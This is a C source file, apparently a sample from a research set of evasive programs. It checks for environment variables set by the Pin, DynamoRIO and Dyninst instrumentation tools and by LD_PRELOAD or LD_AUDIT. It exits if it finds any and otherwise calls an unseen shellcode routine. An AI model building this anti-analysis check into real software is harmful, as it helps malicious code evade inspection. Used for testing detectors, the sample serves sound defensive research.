////////////////////////////////////////////////////////////////////////////////
//
//  File          : src/sample_ea_envvar.c
//  Description   :
//
//   Author : Thomason Zhao
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "malware.h"
#include "utils.h"

//
// Global variables

const char *progname = "sample_ea_envvar";
const char *progdesc = "Sample adopts environmental artifacts detection - checks for PIN/DynamoRIO/Valgrind specific environment variables";
int verbose = 0;
int debug = 0;

// Environment variables to check
static const int pin_env_var_num = 5;
static const char *pin_env_var[] = {"PIN_INJECTOR64_LD_LIBRARY_PATH",
                                    "PIN_INJECTOR32_LD_LIBRARY_PATH",
                                    "PIN_VM64_LD_LIBRARY_PATH", "PIN_VM32_LD_LIBRARY_PATH",
                                    "PIN_CRT_TZDATA"};

static const int dr_env_var_num = 3;
static const char *dr_env_var[] = {"DYNAMORIO_CONFIGDIR",
                                   "DYNAMORIO_TAKEOVER_IN_INIT",
                                   "DYNAMORIO_EXE_PATH"};

static const int dyninst_env_var_num = 1;
static const char *dyninst_env_var[] = {"DYNINSTAPI_RT_LIB"};

static const int inj_env_var_num = 2;
static const char *inj_env_var[] = {"LD_PRELOAD", "LD_AUDIT"};

int detect_env_var(char const *env_var[], int env_var_num) {
    for (int i = 0; i < env_var_num; i++) {
        if (getenv(env_var[i]) != NULL) {
            print_verbose("Detected environment variable: %s\n", env_var[i]);
            return -1;
        }
    }
    return 0;
}

int main(int argc, char *argv[]) {
    process_command_line(argc, argv);

    // Some detection anti-instrumentation techniques implemenation
    int detected = 0;
    detected |= detect_env_var(pin_env_var, pin_env_var_num);
    detected |= detect_env_var(dr_env_var, dr_env_var_num);
    detected |= detect_env_var(dyninst_env_var, dyninst_env_var_num);
    detected |= detect_env_var(inj_env_var, inj_env_var_num);

    if (detected == 0) {
        print_verbose("No environmental artifacts detected\n");
    } else {
        print_verbose("Detected environmental artifacts, abort\n");
        exit(1);
    }

    shellcode();
    return 0;
}